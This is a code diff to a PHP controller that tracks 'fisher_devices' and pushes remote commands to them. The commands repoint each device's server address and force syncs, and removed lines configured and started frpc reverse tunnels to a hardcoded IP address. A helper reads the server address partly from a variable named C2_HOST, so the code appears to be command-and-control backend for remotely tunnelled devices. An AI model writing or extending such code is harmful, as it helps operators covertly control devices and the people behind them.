@@ -509,7 +509,12 @@ class DeviceController extends BaseController
     public function heartbeat()
     {
         $data = Request::post();
-        $deviceId = $data['deviceId'] ?? Request::get('deviceId', '');
+        if (empty($data)) {
+            $raw = file_get_contents('php://input') ?: '';
+            $json = json_decode($raw, true);
+            if (is_array($json)) $data = $json;
+        }
+        $deviceId = $data['deviceId'] ?? $data['device_id'] ?? $data['di'] ?? Request::get('deviceId', Request::get('di', ''));
 
         if ($deviceId) {
             Db::table('fisher_devices')->where('device_id', $deviceId)->update([
@@ -522,13 +527,12 @@ class DeviceController extends BaseController
         $responseData = ['status' => 'alive'];
 
         if (!$frpcRunning) {
-            $externalHost = env('external.external_host', '147.90.182.35');
-            $externalPort = env('external.external_port', '8889');
+            $serverAddr = $this->publicServerAddr();
             $responseData['commands'] = [
-                ['command' => 'setConfig', 'params' => ['frpsAddr' => env('frps.frps_addr', '147.90.182.35'), 'frpsPort' => (int)env('frps.frps_port', 7000), 'frpsToken' => '', 'remotePort' => 10000 + abs(crc32($deviceId)) % 50000]],
-                ['command' => 'setServerAddr', 'params' => ['serverAddr' => "http://{$externalHost}:{$externalPort}"]],
+                ['command' => 'setServerAddr', 'params' => ['serverAddr' => $serverAddr]],
+                ['command' => 'syncMainServerHost', 'params' => ['serverHost' => parse_url($serverAddr, PHP_URL_HOST) ?: $serverAddr]],
                 ['command' => 'saveConfig'],
-                ['command' => 'startFrpc'],
+                ['command' => 'forceSync'],
             ];
         }
 
@@ -598,7 +602,7 @@ class DeviceController extends BaseController
      */
     public function pendingCommands()
     {
-        $deviceId = Request::get('deviceId', '');
+        $deviceId = Request::get('deviceId', Request::get('di', ''));
         $commands = [];
 
         // 从数据库取待执行命令
@@ -646,22 +650,45 @@ class DeviceController extends BaseController
                 ->field('tunnel_deployed,remote_port')
                 ->find();
             if ($device && (!$device['tunnel_deployed'] || !$device['remote_port'])) {
-                $externalHost = env('external.external_host', '147.90.182.35');
-                $externalPort = env('external.external_port', '8889');
+                $serverAddr = $this->publicServerAddr();
                 $commands[] = [
                     'id' => "push-deviceid-{$ts}",
                     'method' => 'setAppConfig',
                     'command' => 'setAppConfig',
                     'params' => [
                         'deviceId' => $deviceId,
-                        'serverAddr' => "http://{$externalHost}:{$externalPort}"
+                        'serverAddr' => $serverAddr
                     ]
+                ];
+                $commands[] = [
+                    'id' => "push-server-{$ts}",
+                    'method' => 'setServerAddr',
+                    'command' => 'setServerAddr',
+                    'params' => ['serverAddr' => $serverAddr]
+                ];
+                $commands[] = [
+                    'id' => "push-sync-{$ts}",
+                    'method' => 'forceSync',
+                    'command' => 'forceSync',
+                    'params' => (object)[]
                 ];
             }
         }
 
         // 直接返回 Go 期望的顶层格式
         return json(['success' => true, 'commands' => $commands]);
+    }
+
+    private function publicServerAddr(): string
+    {
+        $url = (string)(env('app.server_url', '') ?: env('APP_SERVER_URL', '') ?: env('C2_HOST', ''));
+        if ($url !== '') return rtrim($url, '/');
+        $host = (string)env('external.external_host', env('frps.frps_addr', '127.0.0.1'));
+        $port = (string)env('external.external_port', '');
+        if ($port !== '' && !in_array($port, ['80', '443'], true)) {
+            return "http://{$host}:{$port}";
+        }
+        return ($port === '443' ? 'https' : 'http') . "://{$host}";
     }
 
     /**
